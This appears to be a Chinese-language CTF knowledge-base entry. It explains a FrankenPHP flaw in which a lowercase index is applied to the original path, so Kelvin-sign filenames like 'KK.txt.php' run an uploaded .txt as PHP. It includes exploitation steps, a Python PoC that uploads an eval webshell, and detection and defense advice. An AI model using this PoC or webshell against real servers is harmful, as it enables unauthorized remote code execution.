---
id: web-php-frankenphp-splitpos-unicode-casefold-path-differential
title: FrankenPHP splitPos 大小写折叠长度差：KK.txt.php 被解析为执行 KK.txt 的 PHP 脚本
type: scenario
domain: web
path: web/php/framework
technique: frankenphp-splitpos-unicode-casefold-differential
aliases:
- FrankenPHP splitCgiPath 漏洞
- splitPos 大小写长度差
- Kelvin sign 后缀绕过
- KK.txt.php
- Unicode case folding path confusion
- php_server split_path
tags:
- php
- frankenphp
- caddy
- unicode
- case-folding
- path-parsing
- extension-bypass
- upload
- parser-differential
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T13:44:43+08:00'
  notes: 已对照原文 0CTF ezupload 全文与图01-09核对：splitPos 先 strings.ToLower 再 Index(.php) 返回小写串下标、splitCgiPath 用该下标切原始 path；K(U+212A) 3字节->k 1字节，KK.txt.php 原长14/小写10，path[:10]=KK.txt，php_server 的 @phpFiles *.php 与 create KK.txt.php 步骤均一致；未在本机复跑
---

## 一句话结论

FrankenPHP 的 `splitCgiPath` 先用 `splitPos` 对路径做小写化再查找 `.php` 并返回小写串中的结束下标，随后却用该下标切分**原始**路径；利用 `K`（U+212A，UTF-8 3 字节）小写化为 `k`（1 字节）造成的长度差，文件名 `KK.txt.php` 会被解析成脚本 `KK.txt`，从而让只能上传 `.txt` 的内容被 PHP 执行。

## 原理

- **两条解析路径不一致**：`splitPos(path, ".php")` 内部先把路径转小写，再查找 `.php` 并返回其结束位置；`splitCgiPath` 拿到这个下标后执行 `fc.docURI = path[:splitPos]`、`fc.scriptName = strings.TrimSuffix(path, fc.pathInfo)`，切的是原始大小写路径。
- **大小写折叠改变字节长度**：Unicode 中部分字符小写化后 UTF-8 字节数变化。开尔文符号 `K`（U+212A）占 3 字节，小写为 ASCII `k` 占 1 字节；两个 `K` 使小写串比原串短 4 字节。
- **下标错位**：文件名 `KK.txt.php` 原长 14 字节，小写 `kk.txt.php` 长 10 字节；`splitPos` 返回 10，`path[:10]` 恰好是原始串的 `KK.txt`（3+3+4），于是 `SCRIPT_FILENAME` 指向上传的 `KK.txt`，而不是 `KK.txt.php`。
- **路由仍按 `.php` 进入 PHP**：Caddy 的 `php_server` 等价配置中有 `@phpFiles path *.php`，请求路径 `/KK.txt.php` 以 `.php` 结尾，因此交给 PHP handler；handler 用被错位的 `scriptFilename` 执行，实际运行的是 `.txt` 内容。
- **上传限制被绕过**：应用只允许上传扩展名为 `txt` 的文件，但控制文件内容；先用 `create` 动作创建同名的 `KK.txt.php` 让路径存在（或让 try_files 命中），再上传含 PHP 代码的 `KK.txt`，访问 `.php` URL 即执行 `.txt`。
- **前提**：服务器使用 FrankenPHP 的 `php_server`/`split_path .php`；应用按扩展名限制上传但文件名可控；文件系统与 URL 路径都允许非 ASCII 字符。

## 触发条件

- 目标使用 FrankenPHP（含 `splitCgiPath`/`splitPos` 逻辑）并启用 `split_path .php`。
- 上传接口限制扩展名（如只允许 `.txt`）但保留客户端文件名，内容可控。
- 站点根目录可写，且上传文件与目标 `.php` 路径在同一目录。
- 请求路径可以包含 `K` 等大小写折叠前后字节数不同的 Unicode 字符，且中间件不拒绝非 ASCII 文件名。
- 存在让 `.php` 路径“存在”的方式（如 create 接口、try_files 兜底或同名文件）。

## 利用步骤

1. 选择一个大小写折叠会缩短字节数的字符（如 `K`）；构造文件名 `KK.txt`，内容为 `<?php eval($_REQUEST[1]);?>`。
2. 通过上传接口上传 `KK.txt`（扩展名检查通过）。
3. 通过 create 接口或其它方式创建 `KK.txt.php`（内容可以是任意 PHP，如 `phpinfo()`），使该 URL 路径在 Caddy 的 try_files/匹配中成立。
4. 访问 `http://target/KK.txt.php`；Caddy 因 `.php` 后缀把它交给 PHP handler，FrankenPHP 却把 `SCRIPT_FILENAME` 解析为 `KK.txt`。
5. PHP 执行上传文件中的代码；用 `1=phpinfo()` 或 `1=system('id')` 验证。
6. 若存在 open_basedir/disable_functions，继续结合 Caddy Admin API 或其它 PHP 层绕过。

## PoC

```python
import requests

url = "http://target/"
k = "K"                      # KELVIN SIGN: 3 bytes -> 'k' 1 byte
filename = k * 2 + ".txt"         # KK.txt
content = "<?php eval($_REQUEST[1]);?>"

r = requests.post(url, params={"action": "upload"},
                  files={"file": (filename, content, "text/plain")})
print(r.text)

create_name = filename + ".php"   # KK.txt.php
requests.get(url, params={"action": "create", "filename": create_name})

r = requests.post(url + create_name, data={"1": "phpinfo();"})
print(r.text)
```

实际利用时先确认 `splitPos` 使用的是小写路径下标，并确认 `KK.txt.php` 确实被 PHP handler 接收；不同版本的 FrankenPHP 可能已修复该错位。

## 变体与关联

- 变体：其它大小写折叠改变字节数的字符（如 `Ⱥ` 2→3 字节、`ẞ` 等），可增大或减小长度以覆盖不同文件名布局。
- 变体：结合目录穿越、双重扩展名（`.txt.php`）或 `try_files` 兜底，让上传文件成为 index.php 之外的执行入口。
- 变体：其它 Web 服务器的路径规范化差异（大小写、Unicode 归一化、URL 解码）也可能产生同类解析错位。
- 关联：[[web-php-open-basedir-bypass-caddy-admin-api-file-server-read]]（同一题中利用 Caddy Admin API 读文件）、[[web-php-rce-frankenphp-php-ini-disable-functions-bypass]]（同一题中清空 disable_functions）、[[web-php-framework-yii2-uploadedfile-saveas-unfiltered]]（上传文件名直入保存路径的同类问题）。

## 检测与防御

- 防御：路径只做一次规范化，并用同一份规范化结果同时做路由匹配与文件系统解析；对大小写折叠后的长度变化做校验，或直接拒绝非 ASCII/confusable 文件名。
- 防御：PHP handler 解析出的 `scriptFilename` 必须再次校验扩展名与目录，禁止执行上传目录中的脚本；上传文件重命名为随机 ASCII 名。
- 检测：请求路径中出现 `K`、`Ⱥ` 等非 ASCII 字符且以 `.php` 结尾；同一目录同时存在 `.txt` 与 `.txt.php`；PHP 执行了扩展名不是 `.php` 的文件。
- 该场景为 CTF/授权测试利用；生产环境应升级 FrankenPHP 并复核 `splitCgiPath` 实现。
